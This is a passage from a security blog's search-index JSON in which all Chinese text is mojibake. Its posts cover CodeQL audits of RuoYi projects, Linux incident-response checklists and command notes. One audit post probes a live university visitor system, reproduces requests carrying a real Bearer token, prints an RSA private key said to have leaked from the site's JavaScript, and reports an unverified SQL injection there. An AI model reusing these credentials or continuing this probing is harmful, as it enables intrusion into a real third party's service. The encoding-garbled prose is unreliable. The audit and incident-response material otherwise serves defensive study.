fastjsonè™½ç„¶æœ¬é¡¹ç›®ä½¿ç”¨çš„ç‰ˆæœ¬1.2.3å­˜åœ¨æ¼æ´ï¼Œä½†æ˜¯é¡¹ç›®ä¸­è²Œä¼¼æ²¡ä½¿ç”¨ï¼Œæ²¡æœ‰å®¡è®¡å‡ºæ¼æ´ å®¡è®¡æ–¹æ³•ï¼šå…¨å±€æœç´¢json.parseObject æ²¡æœ‰åœ¨é¡¹ç›®ä¸­æ‰¾åˆ°å¼•ç”¨ï¼Œä¼°è®¡æ˜¯æ²¡æœ‰æ¼æ´ log4j2æœ¬é¡¹ç›®ç‰ˆæœ¬ï¼š1.2.17æœç´¢äº†ä¸€ä¸‹å‘ç°æ²¡æœ‰è°ƒç”¨çš„ï¼Œå®¡è®¡ä¸å‡ºæ¥æ¼æ´","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/å®æˆ˜","slug":"ä»£ç å®¡è®¡-java-å®æˆ˜","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"ruoyi-vue-proä»£ç å®¡è®¡","slug":"ruoyi-vue-proä»£ç å®¡è®¡","date":"2024-10-23T14:14:16.000Z","updated":"2024-10-30T14:07:33.789Z","comments":true,"path":"2024/10/23/ruoyi-vue-proä»£ç å®¡è®¡/","permalink":"http://example.com/2024/10/23/ruoyi-vue-pro%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"2024-10-23ğŸŒ±æ¹–å·: â˜€ï¸ ğŸŒ¡ï¸+13Â°C ğŸŒ¬ï¸â†4km&#x2F;h çº¿ä¸Šå®è·µé¡¹ç›®åœ°å€ï¼šhttp://zlbz.uzz.edu.cn/login æºç é¡¹ç›®åœ°å€ï¼šhttps://github.com/YunaiV/ruoyi-vue-pro ä½¿ç”¨CodeQLè¿›è¡Œåˆ†æ ç”Ÿæˆæ•°æ®åº“ 1codeql database create D:/tools/CodeQL/databases/codeql_ruoyi-vue-pro --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=D:\\JavaProgram\\ruoyi-vue-pro\\ è¿™é‡Œå®¡è®¡çš„æ˜¯æœ€æ–°ç‰ˆæœ¬çš„ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆæ¼æ´ï¼Œæœç„¶ç»å¸¸æ›´æ–°çš„é¡¹ç›®æ˜¯æ²¡æœ‰å•¥æ¼æ´çš„","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/å®æˆ˜","slug":"ä»£ç å®¡è®¡-java-å®æˆ˜","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"ä½¿ç”¨codeqlè¿›è¡Œä»£ç å®¡è®¡","slug":"ä½¿ç”¨codeqlè¿›è¡Œä»£ç å®¡è®¡","date":"2024-10-18T06:37:35.000Z","updated":"2024-10-30T14:06:16.900Z","comments":true,"path":"2024/10/18/ä½¿ç”¨codeqlè¿›è¡Œä»£ç å®¡è®¡/","permalink":"http://example.com/2024/10/18/%E4%BD%BF%E7%94%A8codeql%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"2024-10-18ğŸŒ±æ¹–å·: ğŸŒ¦ ğŸŒ¡ï¸+28Â°C ğŸŒ¬ï¸â†’10km&#x2F;h å‰ææŒ‰ç…§æˆ‘ä¹‹å‰çš„æ–‡ç« CodeQLçš„ä½¿ç”¨ä¸‹è½½é…ç½®å¥½ç¯å¢ƒ codeql vscode æ­¥éª¤ğŸå‡†å¤‡é˜¶æ®µé¦–å…ˆæ‰“å¼€ä»¥ä¸‹çš„ç½‘å€ï¼Œé‡Œé¢æ˜¯å®˜æ–¹æä¾›çš„qlæŸ¥è¯¢æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ https://codeql.githubdocs.cn/codeql-query-help/java/ åˆ›å»ºæ•°æ®åº“1codeql database create D:/tools/CodeQL/databases/codeql_ruoyi-wechat-mp --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=D:\\JavaProgram\\ruoyi-wechat-mp\\ ç±»ä¼¼å¦‚ä¸Šçš„å‘½ä»¤ï¼Œ æ‰“å¼€vscodeï¼Œå¯¼å…¥æ•°æ®åº“ å¯¼å…¥åˆšåˆšç”Ÿæˆçš„æ•°æ®åº“ xsså®¡è®¡è„šæœ¬ä½ç½®ï¼š codeql/java/ql/src/Security/CWE/CWE-079/XSS.ql SSRFå®¡è®¡è„šæœ¬ä½ç½® codeql/java/ql/src/Security/CWE/CWE-918/RequestForgery.ql","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/å®æˆ˜","slug":"ä»£ç å®¡è®¡-java-å®æˆ˜","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"Linuxåº”æ€¥å“åº”æµç¨‹","slug":"Linuxåº”æ€¥å“åº”æµç¨‹","date":"2024-09-26T14:23:55.000Z","updated":"2024-10-30T14:04:12.166Z","comments":true,"path":"2024/09/26/Linuxåº”æ€¥å“åº”æµç¨‹/","permalink":"http://example.com/2024/09/26/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B/","excerpt":"","text":"âœå†…å®¹æŸ¥çœ‹ç³»ç»ŸåŸºæœ¬ä¿¡æ¯ ç³»ç»Ÿç‰ˆæœ¬uname -a å®‰è£…æ—¶é—´stat &#x2F;root&#x2F;anaconda-ks.cfgstat &#x2F;lost+found&#x2F; è·å–ä¸»æœºåcat &#x2F;etc&#x2F;hostname ç³»ç»Ÿç›®å‰å®‰è£…çš„rpm rpm -qa rpm -V -a æŸ¥çœ‹é˜²ç«å¢™è§„åˆ™iptables-save &gt; path æŸ¥çœ‹å½“å‰çš„è¿›ç¨‹ps -aux æŸ¥çœ‹åŠ è½½çš„æ‰€æœ‰æ¨¡å—lsmod ç½‘ç»œä¿¡æ¯ ç½‘å¡ä¿¡æ¯ip a dnsä¿¡æ¯ cat &#x2F;etc&#x2F;resolv.conf è·¯ç”±è¡¨ route -n arpè¡¨arp -a ç½‘ç»œç«¯å£ä¿¡æ¯netstat -antpul æ—¥å¿—ä¿¡æ¯&#x2F;var&#x2F;log&#x2F;cron*&#x2F;var&#x2F;log&#x2F;mail*&#x2F;var&#x2F;log&#x2F;mysqld.log*&#x2F;var&#x2F;log&#x2F;yum.log*ç­‰ç­‰","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://example.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”/Linux/ç¬”è®°","slug":"åº”æ€¥å“åº”-Linux-ç¬”è®°","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"}]},{"title":"Linuxå¸¸è§„æ£€æŸ¥","slug":"Linuxå¸¸è§„æ£€æŸ¥","date":"2024-09-26T10:30:30.000Z","updated":"2024-10-30T14:03:59.061Z","comments":true,"path":"2024/09/26/Linuxå¸¸è§„æ£€æŸ¥/","permalink":"http://example.com/2024/09/26/Linux%E5%B8%B8%E8%A7%84%E6%A3%80%E6%9F%A5/","excerpt":"","text":"âœå†…å®¹æ–‡ä»¶æ£€æŸ¥ğŸ‡å†å²å‘½ä»¤ rootç”¨æˆ·æ‰§è¡Œè¿‡çš„å†å²å‘½ä»¤ &#x2F;root&#x2F;.bash_history å¯¹åº”çš„ç”¨æˆ·æ‰§è¡Œè¿‡çš„å†å²å‘½ä»¤ &#x2F;home&#x2F;{username}&#x2F;.bash_history å½“å‰ç”¨æˆ·æ‰§è¡Œè¿‡çš„å†å²å‘½ä»¤ history 1ã€å¿«é€Ÿå¤‡ä»½å†å²å‘½ä»¤ï¼Œç„¶åæ£€æŸ¥ 1cd /tmp 1mkdir cmd 1cd cmd 1cp ~/.bash_history root_history 123find /home -name .bash_history -exec cat &#123;&#125; \\; &gt; /tmp/cmd/user_historyOR find /home -name .bash_history | xargs cat &gt; /tmp/cmd/user_history æ³¨æ„ï¼šä¸€èˆ¬æ˜¯.bash_historyï¼Œä½†æ˜¯å…·ä½“çš„çœ‹å®‰è£…çš„å‘½ä»¤è¡Œæ˜¯ä»€ä¹ˆï¼Œæ¯”å¦‚kaliä½¿ç”¨çš„æ˜¯zshï¼Œæ‰€ä»¥å†å²å‘½ä»¤åœ¨.zsh_historyä¸­ ğŸ‡ç³»ç»Ÿå…³é”®æ–‡ä»¶&#x2F;etc&#x2F;passwdç”¨æˆ·å’Œå¯†ç &#x2F;etc&#x2F;shadowç”¨æˆ·å’Œå¯†ç &#x2F;etc&#x2F;groupç¾¤ç»„&#x2F;etc&#x2F;profileè¿è¡Œçš„åˆå§‹æ–‡ä»¶ï¼Œrootç›®å½•ä¸‹å’Œç”¨æˆ·ç›®å½•ä¸‹ä¹Ÿæœ‰ï¼Œå¯ä»¥è‡ªå®šä¹‰å˜é‡ &#x2F;root&#x2F;.bashrcæˆ–è€…&#x2F;root&#x2F;.zshrcä¸€äº›ç»ˆç«¯è®¾ç½®&#x2F;root&#x2F;.bash_logouté€€å‡ºæ—¶åšçš„å‘½ä»¤ .sshç›®å½•ä¸‹çš„authorized_keysæ–‡ä»¶ æ”»å‡»è€…å¯ä»¥å°†è‡ªå·±çš„sshçš„å…¬é’¥ä¸Šä¼ åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åå¯ä»¥é€šè¿‡å¯†é’¥ç™»å½•ssh è¿™äº›å…³é”®æ€§æ–‡ä»¶ä¹Ÿæ˜¯å…ˆå¤‡ä»½ä¸€ä¸‹ ğŸ‡ç³»ç»Ÿå…³é”®ç›®å½•&#x2F;tmp&#x2F;var&#x2F;tmp&#x2F;dev&#x2F;shm&#x2F; ä»¥ä¸Šçš„å‡ ä¸ªç›®å½•é»˜è®¤å¯è¯»å¯å†™ï¼Œä¸€èˆ¬æ”»å‡»è€…çš„è‡ªåŠ¨åŒ–è„šæœ¬éƒ½ä¼šåœ¨è¿™å‡ ä¸ªç›®å½• å‘½ä»¤æ£€æŸ¥&#x2F;usr&#x2F;bin&#x2F;netstat&#x2F;usr&#x2F;bin&#x2F;ps&#x2F;usr&#x2F;sbin&#x2F;lsof&#x2F;usr&#x2F;bin&#x2F;md5sum&#x2F;usr&#x2F;sbin&#x2F;ss&#x2F;usr&#x2F;bin&#x2F;stat ä»¥ä¸Šçš„å‘½ä»¤å¯èƒ½ä¼šè¢«ä¸²æ”¹ï¼Œæ‰€ä»¥å¿…é¡»è¦æ£€æŸ¥ä¸‹ ç³»ç»Ÿå®‰è£…åŒ…æ£€æŸ¥centosåˆ—å‡ºæ‰€æœ‰çš„å®‰è£…çš„rpmåŒ…rpm -qaæ ¡éªŒæ‰€æœ‰çš„å®‰è£…çš„rpmåŒ…rpm -V -aæ ¡éªŒæŒ‡å®šçš„æ–‡ä»¶æˆ–è€…å‘½ä»¤rpm -V -f &#x2F;etc&#x2F;sysconfig æ—¥å¿—æ–‡ä»¶æ£€æŸ¥secure è®°å½•ä¸å®‰å…¨ç›¸å…³çš„ä¿¡æ¯ lastlog ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´ï¼Œlastlogå‘½ä»¤æŸ¥çœ‹ wtmp æ°¸ä¹…çš„è®°å½•ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€åŠç³»ç»Ÿçš„å¯åŠ¨ã€åœæœºçš„äº‹ä»¶ btmp å°è¯•ç™»å½•å¤±è´¥çš„æ—¥å¿— messages å„ç§ç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹ã€ç”¨æˆ·ç¨‹åºå’Œå†…æ ¸ç›¸å…³ä¿¡æ¯ cron crontabæ—¥å¿— audit&#x2F;* ç›‘æ§ç³»ç»Ÿè°ƒç”¨ boot.log å¯åŠ¨ä¿¡æ¯ç›¸å…³æ—¥å¿— ç³»ç»Ÿå¯åŠ¨æ£€æŸ¥&#x2F;etc&#x2F;rc.local centosä¸­ç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­æ·»åŠ è„šæœ¬å‘½ä»¤ï¼Œç³»ç»Ÿåœ¨å¯åŠ¨æ—¶åŠ è½½ï¼Œcentos6ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä½†æ˜¯centos7ä¸­éœ€è¦åœ¨è®¾ç½®ä¸­å…è®¸ systemctl list-unit-files â€“type&#x3D;service | grep enable æŸ¥è¯¢ç³»ç»Ÿè‡ªå¯åŠ¨","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://example.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”/Linux/ç¬”è®°","slug":"åº”æ€¥å“åº”-Linux-ç¬”è®°","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"}]},{"title":"Linuxå¸¸ç”¨å‘½ä»¤","slug":"Linuxå¸¸ç”¨å‘½ä»¤","date":"2024-09-26T06:10:31.000Z","updated":"2024-10-30T14:05:49.303Z","comments":true,"path":"2024/09/26/Linuxå¸¸ç”¨å‘½ä»¤/","permalink":"http://example.com/2024/09/26/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"âœå†…å®¹statnetstat123456789-n ä¸é€‚ç”¨åŸŸåï¼Œä½¿ç”¨IP-a æ˜¾ç¤ºæ‰€æœ‰çš„socketsè¿æ¥-t æ˜¾ç¤ºæ‰€æœ‰çš„tcpè¿æ¥-u æ˜¾ç¤ºæ‰€æœ‰çš„udpè¿æ¥-p æ˜¾ç¤ºè¿›ç¨‹å·-l æ˜¾ç¤ºé™„åŠ ä¿¡æ¯ä¸€èˆ¬æ˜¯ç›´æ¥ä½¿ç”¨netstat -antupå³å¯ lsof12345678lsof -c sshdæ˜¾ç¤ºæœåŠ¡sshdæ‰“å¼€çš„æ–‡ä»¶lsof -p pidæ˜¾ç¤ºè¿›ç¨‹å·ä¸ºpidçš„è¿›ç¨‹æƒ…å†µlsof +d /tmpæ˜¾ç¤ºç›®å½•ä¸‹è¢«è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶lsof +D /tmpé€’å½’æ˜¾ç¤ºç›®å½•ä¸‹è¢«è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ ps12ps -aux topåŠ¨æ€æ˜¾ç¤ºå†…å­˜å ç”¨æƒ…å†µ grep\\12-i å¿½ç•¥å¤§å°å†™-r æ’é™¤åŒ¹é…åˆ°çš„é¡¹ç›® find12345678910find path -name é¡¹ç›®åœ¨pathè·¯å¾„ä¸‹å¯»æ‰¾æŒ‡å®šé¡¹ç›®find path -perm 777åœ¨pathè·¯å¾„ä¸‹å¯»æ‰¾æŒ‡å®šæƒé™çš„é¡¹ç›®find path -mtime -nåœ¨pathè·¯å¾„ä¸‹ä¿®æ”¹æ—¶é—´å°äºnå¤©çš„find path -mtime +nåœ¨pathè·¯å¾„ä¸‹ä¿®æ”¹æ—¶é—´å¤§äºnå¤©çš„ tcpdump123456789101112tcpdump -i eth0æŠ“å–ç½‘å¡eth0çš„æµé‡tcpdump tcpæŠ“å–tcpçš„æµé‡tcpdump port 53æŠ“å–æŒ‡å®šç«¯å£æµé‡tcpdump -w wireshark.pcapæŠ“å–æµé‡å‚¨å­˜ä¸ºwiresharkåŒ… md5sumè®¡ç®—md5å€¼ stringså¿«é€Ÿæ‰“å°æ–‡ä»¶ä¸­çš„å­—ç¬¦ï¼Œå¸¸ç”¨æ¥æå–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å­—ç¬¦ sshä½¿ç”¨å…¬é’¥ç™»å½•ssh ç”Ÿæˆå…¬ç§é’¥ 1ssh-keygen å°†ç”Ÿæˆçš„å…¬é’¥å¤åˆ¶åˆ°rootæˆ–è€…å…¶ä»–çš„ç”¨æˆ·çš„.sshç›®å½•ä¸‹ 1cat rsa_pub &gt; /root/.ssh/authorized_keys ä¿®æ”¹sshé…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ 1vim /etc/ssh/sshd_config å°†ä¸‹é¢çš„PubkeyAuthenticationå–æ¶ˆæ³¨é‡Šï¼Œå¹¶ä¸”æ”¹æˆyeså°†PasswordAuthenticationå–æ¶ˆæ³¨é‡Šï¼Œå¹¶ä¸”æ”¹æˆnoï¼Œè‹¥æ˜¯ä¸ä¿®æ”¹çš„è¯åˆ™ä¼šæ—¢éœ€è¦å¯†ç ï¼Œä¹Ÿéœ€è¦å…¬é’¥ç™»å½• ä¿®æ”¹å®Œåéœ€è¦é‡å¯sshæœåŠ¡ 1service ssh restart xshellç™»å½• æ–¹æ³•é€‰æ‹©Public keyç™»å½•ï¼Œç„¶åç™»å½•æ—¶æ ¹æ®æç¤ºé€‰æ‹©å¯¹åº”çš„rsaç§é’¥æ–‡ä»¶å³å¯ï¼Œæ³¨æ„è¦ä½¿ç”¨å¯¹åº”çš„ç”¨æˆ·åç™»å½• Linuxç™»å½• ssh &#114;&#x6f;&#111;&#116;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x37;&#52;&#x2e;&#49;&#x33;&#48; -i .&#x2F;rsa_private","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"http://example.com/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”/Linux/ç¬”è®°","slug":"åº”æ€¥å“åº”-Linux-ç¬”è®°","permalink":"http://example.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"}]},{"title":"ruoyi-wechat-mpä»£ç å®¡è®¡","slug":"ruoyi-wechat-mpä»£ç å®¡è®¡","date":"2024-06-11T01:32:50.000Z","updated":"2024-10-30T14:07:53.041Z","comments":true,"path":"2024/06/11/ruoyi-wechat-mpä»£ç å®¡è®¡/","permalink":"http://example.com/2024/06/11/ruoyi-wechat-mp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"âœå†…å®¹éƒ¨ç½²ruoyi-wechat-mpä¸‹è½½1git clone https://gitee.com/zhangjqi2015/ruoyi-wechat-mp.git ruoyiå®˜ç½‘æ–‡æ¡£https://doc.ruoyi.vip/ruoyi/document/hjbs.html#%E9%83%A8%E7%BD%B2%E7%B3%BB%E7%BB%9F å®‰è£…å‚è€ƒæ–‡æ¡£https://blog.csdn.net/m0_67376124/article/details/127617498 ä¿®æ”¹æ•°æ®åº“çš„è¿æ¥é…ç½®æ‰“å¼€ruoyi-wechat-mp/ruoyi-admin/src/main/resources/application-druid.yml 1234567j# ä¸»åº“æ•°æ®æº master: url: jdbc:mysql://localhost:3306/ry?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8 username: root password: rootå…¶ä¸­ryæ˜¯æˆ‘çš„æ•°æ®åº“å æ‰§è¡Œsqlæ–‡ä»¶æˆ‘æ˜¯ç”¨navicatæ–°å»ºäº†ä¸€ä¸ªæ•°æ®åº“ï¼Œç„¶åæ‰§è¡Œsqlå‘½ä»¤ 1å°†ruoyi-wechat-mp\\sqlä¸­çš„æ‰€æœ‰sqlæ–‡ä»¶æ‰§è¡Œå³å¯ ä¸‹è½½redishttps://github.com/tporadowski/redis/releases ä¸‹è½½ä¾¿æºç‰ˆå°±è¡Œäº† å¯åŠ¨å‰ç«¯1234æ‰“å¼€ruoyi-wechat-mp/ruoyi-uiæ–‡ä»¶å¤¹ï¼Œåœ¨è¿™é‡Œä½¿ç”¨cmdå‘½ä»¤ npm install ç„¶åå¯åŠ¨ç¯å¢ƒ 1npm run dev è¿™é‡Œé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ Error: error:0308010C:digital envelope routines::unsupported bugè§£å†³æŠ¥é”™åŸå› ï¼š ä¸»è¦æ˜¯å› ä¸º nodeJs V17 ç‰ˆæœ¬å‘å¸ƒäº† OpenSSL3.0 å¯¹ç®—æ³•å’Œç§˜é’¥å¤§å°å¢åŠ äº†æ›´ä¸ºä¸¥æ ¼çš„é™åˆ¶ï¼ŒnodeJs v17 ä¹‹å‰ç‰ˆæœ¬æ²¡å½±å“ï¼Œä½† V17 å’Œä¹‹åç‰ˆæœ¬ä¼šå‡ºç°è¿™ä¸ªé”™è¯¯ã€‚ æˆ‘çš„nodeç‰ˆæœ¬æ˜¯v20+ 12345678910111213141516171819åœ¨é¡¹ç›®ä¸­ package.json çš„ scripts ä¸­æ–°å¢ SET NODE_OPTIONS=--openssl-legacy-provideræ·»åŠ å‰ï¼š&quot;scripts&quot;: &#123;&quot;dev&quot;: &quot;vue-cli-service serve&quot;, &quot;build:prod&quot;: &quot;vue-cli-service build&quot; &#125;,æ·»åŠ å:&quot;scripts&quot;: &#123;&quot;dev&quot;: &quot;SET NODE_OPTIONS=--openssl-legacy-provider &amp;&amp; vue-cli-service serve&quot;, &quot;build:prod&quot;: &quot;SET NODE_OPTIONS=--openssl-legacy-provider &amp;&amp; vue-cli-service build&quot; &#125;, å‚è€ƒï¼šhttps://blog.csdn.net/scholar_man/article/details/134491200 æµ‹è¯•ç¯å¢ƒå¯åŠ¨redis-server å¯åŠ¨mysql å¯åŠ¨åç«¯ideaä¸­ç›´æ¥è¿è¡Œå°±å¥½äº† å¯åŠ¨å‰ç«¯npm run dev Ruoyiæ¡†æ¶å¤§è‡´æˆåŠŸäº† ä»£ç å®¡è®¡çº¿ä¸Šå®è·µé¡¹ç›®åœ°å€ï¼šhttps://pazy.uzz.edu.cn/ ä½¿ç”¨CodeQLè¿›è¡Œåˆ†æ ç”Ÿæˆæ•°æ®åº“ 1codeql database create D:/tools/CodeQL/databases/codeql_ruoyi-wechat-mp --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=D:\\JavaProgram\\ruoyi-wechat-mp\\ ä½¿ç”¨å‘½ä»¤è¡Œè¿è¡Œæ‰«æ12codeql database analyze D:\\tools\\CodeQL\\databases\\codeql_ruoyi-wechat-mp D:/tools/CodeQL/ql/java/ql/src/codeql-suites/java-security-extended.qls --format=csv --output=java-results.csv æˆ–è€…æ˜¯ä½¿ç”¨vscodeæŸ¥çœ‹ å¯¼å…¥æ•°æ®åº“ è¿è¡ŒæŒ‡å®šçš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ ä¸Šä¼ çš„æ–‡ä»¶åœ°å€https://pazy.uzz.edu.cn/api/profile/avatar/2024/10/18/image/1729264045573.jpegå°ç¨‹åºåœ°å€https://pazy.uzz.edu.cn/visitorh5/#/pages/login å…¶ä¸­ä¸€ä¸ªæ•°æ®åŒ…çš„åœ°å€ 123456789101112GET /api/order/visitInfo/getVisitList?pageSize=1&amp;pageNum=50 HTTP/1.1Host: pazy.uzz.edu.cnAuthorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImNlYTc2MWIzLTk4NjUtNDBhOS05NmI0LTU5OTZkZTZiNzQ4MCJ9.L79PKW0MDpzUzcOyOohEDCsLj3jQov2sCtl1CrnJsGRIE675O30qI1Mt0mxIMmoIGKW688LDKqxUA83zjWxYaQUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c11) XWEB/11437 FlueAccept: */*Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://pazy.uzz.edu.cn/visitorh5/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive æ–‡ä»¶ä¸Šä¼ åœ°å€ 123456789101112131415161718192021POST /api/order/visitUserInfo/file HTTP/1.1Host: pazy.uzz.edu.cnContent-Length: 4684Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImNlYTc2MWIzLTk4NjUtNDBhOS05NmI0LTU5OTZkZTZiNzQ4MCJ9.L79PKW0MDpzUzcOyOohEDCsLj3jQov2sCtl1CrnJsGRIE675O30qI1Mt0mxIMmoIGKW688LDKqxUA83zjWxYaQUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c11) XWEB/11437 FlueContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryAe90lmWqn7uL2D4EAccept: */*Origin: https://pazy.uzz.edu.cnSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://pazy.uzz.edu.cn/visitorh5/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive------WebKitFormBoundaryAe90lmWqn7uL2D4EContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1729264045573.jpg&quot;Content-Type: image/jpegï¿½ï¿½ï¿½ï¿½ https://210.44.232.92/static/js/app.393c65f7.jsè¿™ä¸ªç›®å½•æ³„éœ²äº†å…¬ç§é’¥çš„åœ°å€ 12publickey:&quot;MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKoR8mX0rGKLqzcWmOzbfj64K8ZIgOdH\\nnzkXSOVOZbFu/TJhZ7rFAN+eaGkl3C4buccQd/EjEsj9ir7ijT7h96MCAwEAAQ==&quot;privatekey=&quot;MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAqhHyZfSsYourNxaY\\n7Nt+PrgrxkiA50efORdI5U5lsW79MmFnusUA355oaSXcLhu5xxB38SMSyP2KvuKN\\nPuH3owIDAQABAkAfoiLyL+Z4lf4Myxk6xUDgLaWGximj20CUf+5BKKnlrK+Ed8gA\\nkM0HqoTt2UZwA5E2MzS4EI2gjfQhz5X28uqxAiEA3wNFxfrCZlSZHb0gn2zDpWow\\ncSxQAgiCstxGUoOqlW8CIQDDOerGKH5OmCJ4Z21v+F25WaHYPxCFMvwxpcw99Ecv\\nDQIgIdhDTIqD2jfYjPTY8Jj3EDGPbH2HHuffvflECt3Ek60CIQCFRlCkHpi7hthh\\nYhovyloRYsM+IS9h/0BzlEAuO0ktMQIgSPT3aFAgJYwKpqRYKlLDVcflZFCKY7u3\\nUP8iWi1Qw0Y=&quot; æœ€åå‘ç°ç™»é™†åå­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä½†æ˜¯å¥ˆä½•æ²¡æœ‰ç”¨æˆ·è´¦å·ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•éªŒè¯","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/å®æˆ˜","slug":"ä»£ç å®¡è®¡-java-å®æˆ˜","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"æ­£æ–¹ç»Ÿä¸€ç®¡ç†è®¤è¯ç³»ç»Ÿä»£ç å®¡è®¡","slug":"æ­£æ–¹ç»Ÿä¸€ç®¡ç†è®¤è¯ç³»ç»Ÿä»£ç å®¡è®¡","date":"2024-05-31T07:13:39.000Z","updated":"2024-10-30T14:06:40.420Z","comments":true,"path":"2024/05/31/æ­£æ–¹ç»Ÿä¸€ç®¡ç†è®¤è¯ç³»ç»Ÿä»£ç å®¡è®¡/","permalink":"http://example.com/2024/05/31/%E6%AD%A3%E6%96%B9%E7%BB%9F%E4%B8%80%E7%AE%A1%E7%90%86%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"âœå†…å®¹éƒ¨ç½²æ­£æ–¹ç»Ÿä¸€è®¤è¯ç³»ç»Ÿå…ˆå®‰è£…Oracleæ•°æ®åº“https://blog.csdn.net/weixin_44841225/article/details/100782269 æ ¹æ®è¿™ä¸ªæ–‡ç« ä¸€æ­¥æ­¥å®‰è£…å¥½æ•°æ®åº“ æ•°æ®åº“ä¿¡æ¯ 12345678910111213åˆ›å»ºæ–°çš„Oracleç”¨æˆ·ï¼šOracleuser123456æ•°æ®åº“æ–‡ä»¶åœ°å€D:\\environment\\oradatasyså¯†ç ï¼š1234Qwer!å®‰è£…å®Œæˆåä¼šæœ‰ä¸€ä¸ªç™»é™†åœ°å€ï¼šhttps://localhost:5500/em/ 